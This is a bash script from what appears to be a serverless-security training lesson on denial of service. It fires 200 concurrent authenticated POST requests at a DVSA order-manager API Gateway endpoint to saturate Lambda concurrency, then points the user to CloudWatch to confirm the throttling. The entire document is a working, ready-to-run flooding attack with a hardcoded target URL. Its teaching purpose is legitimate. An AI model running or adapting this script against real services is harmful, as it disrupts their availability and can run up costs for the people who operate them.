#!/bin/bash
# =============================================================
# Lesson 6 - Denial of Service (DoS) — No Rate Limiting
#
# Floods DVSA-ORDER-MANAGER with concurrent billing requests to
# saturate Lambda concurrency and trigger CloudWatch Throttles.
#
# Usage:
#   export API="https://yi8ph319ja.execute-api.us-east-1.amazonaws.com/dvsa/order"
#   export TOKEN="<your-cognito-access-token>"
#   export ORDER_ID="<your-order-id>"
#   bash run.sh
# =============================================================
set -u

HERE="$(cd "$(dirname "$0")" && pwd)"
PAYLOAD="$HERE/payload.json"

if [ -z "${TOKEN:-}" ] || [ -z "${ORDER_ID:-}" ]; then
  echo "ERROR: set TOKEN and ORDER_ID env vars first." >&2
  echo '  export TOKEN="<your-cognito-access-token>"' >&2
  echo '  export ORDER_ID="<your-order-id>"' >&2
  exit 1
fi

API="${API:-https://yi8ph319ja.execute-api.us-east-1.amazonaws.com/dvsa/order}"

echo "============================================"
echo " Lesson 6: Denial of Service (DoS)"
echo " Target : $API"
echo "============================================"
echo ""
echo "[*] Sending 200 concurrent requests to flood Lambda concurrency ..."
echo ""

# Build the body with the real order-id substituted in
BODY=$(python3 -c "
import json, sys
with open('$PAYLOAD') as f:
    d = json.load(f)
d.pop('_comment', None)
d['order-id'] = '$ORDER_ID'
print(json.dumps(d))
")

# Fire 200 background curl processes
TMPDIR_RESULTS=$(mktemp -d)
for i in $(seq 1 200); do
  curl -s -o "$TMPDIR_RESULTS/$i.txt" -w "%{http_code}" \
    -X POST "$API" \
    -H "Content-Type: application/json" \
    -H "authorization: $TOKEN" \
    -d "$BODY" > "$TMPDIR_RESULTS/code_$i.txt" 2>/dev/null &
done
wait

echo "[*] All requests sent. HTTP status code summary:"
cat "$TMPDIR_RESULTS"/code_*.txt | sort | uniq -c | sort -rn
rm -rf "$TMPDIR_RESULTS"

echo ""
echo "Verify impact in CloudWatch:"
echo "  AWS Console -> CloudWatch -> Metrics -> Lambda -> DVSA-ORDER-MANAGER"
echo "  Check: Invocations spike, Throttles spike, Errors increase, Duration jump"
